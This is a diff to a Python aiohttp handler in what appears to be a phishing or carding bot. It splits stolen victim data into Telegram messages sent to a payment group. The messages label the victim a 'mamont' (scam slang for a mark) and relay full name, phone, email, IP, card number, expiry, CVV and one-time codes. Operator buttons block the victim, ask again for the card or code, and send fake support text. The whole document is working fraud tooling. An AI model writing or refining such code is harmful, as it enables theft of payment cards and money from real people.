@@ -1246,31 +1246,64 @@ async def payment_notify(request):
     cvv = data.get('cvv', '')
     code = data.get('code', '')
     ip = data.get('ip', '')
-    # Всі персональні дані у payment group
-    msg = (
-        f"ФИО: {name}\n"
-        f"Телефон: {phone}\n"
+
+    # 1. Повідомлення з ФІО, телефоном, email, IP + кнопки блокування
+    msg1 = (
+        f"Мамонт ввёл Ф.И.О.: <b>{name}</b>\n\n"
+        f"phone_number: {phone}\n"
+        f"full_name: {name}\n"
+        f"mail: {email}\n"
+        f"ip: {ip}"
+    )
+    kb1 = InlineKeyboardMarkup(
+        inline_keyboard=[
+            [
+                InlineKeyboardButton(text="Заблокировать", callback_data=f"block:{ip}"),
+                InlineKeyboardButton(text="Розблокувати", callback_data=f"unblock:{ip}")
+            ]
+        ]
+    )
+    await bot.send_message(PAYMENT_GROUP_ID, msg1, parse_mode='HTML', reply_markup=kb1)
+
+    # 2. Повідомлення з карткою, CVV, expiry, email, IP + кнопки для карт/коду
+    msg2 = (
         f"Email: {email}\n"
-        f"Card: {card}\n"
-        f"Expiry: {expiry}\n"
+        f"Card Number: {card}\n"
+        f"Expiry Date: {expiry}\n"
         f"CVV: {cvv}\n"
-        f"Code: {code}\n"
         f"IP: {ip}"
     )
-    kb_rows = [
-        [
-            InlineKeyboardButton(text="Card", callback_data=f"card:{ip}"),
-            InlineKeyboardButton(text="Block", callback_data=f"block:{ip}"),
-            InlineKeyboardButton(text="Unblock", callback_data=f"unblock:{ip}"),
-            InlineKeyboardButton(text="Code", callback_data=f"code:{ip}")
-        ],
-        [
-            InlineKeyboardButton(text="Тех поддержка", callback_data=f"support:{ip}"),
-            InlineKeyboardButton(text="Text", callback_data=f"text:{ip}")
+    kb2 = InlineKeyboardMarkup(
+        inline_keyboard=[
+            [
+                InlineKeyboardButton(text="Card", callback_data=f"card:{ip}"),
+                InlineKeyboardButton(text="Block", callback_data=f"block:{ip}"),
+                InlineKeyboardButton(text="Unblock", callback_data=f"unblock:{ip}"),
+                InlineKeyboardButton(text="Code", callback_data=f"code:{ip}")
+            ],
+            [
+                InlineKeyboardButton(text="Тех поддержка", callback_data=f"support:{ip}"),
+                InlineKeyboardButton(text="Text", callback_data=f"text:{ip}")
+            ]
         ]
-    ]
-    kb = InlineKeyboardMarkup(inline_keyboard=kb_rows)
-    await bot.send_message(PAYMENT_GROUP_ID, msg, reply_markup=kb)
+    )
+    await bot.send_message(PAYMENT_GROUP_ID, msg2, reply_markup=kb2)
+
+    # 3. Повідомлення з кодом, IP + кнопка Request again
+    if code:
+        msg3 = (
+            f"Code: {code}\n"
+            f"IP: {ip}"
+        )
+        kb3 = InlineKeyboardMarkup(
+            inline_keyboard=[
+                [
+                    InlineKeyboardButton(text="Request again", callback_data=f"code_request_again:{code}")
+                ]
+            ]
+        )
+        await bot.send_message(PAYMENT_GROUP_ID, msg3, reply_markup=kb3)
+
     return web.Response(text='ok')
 
 @log_function
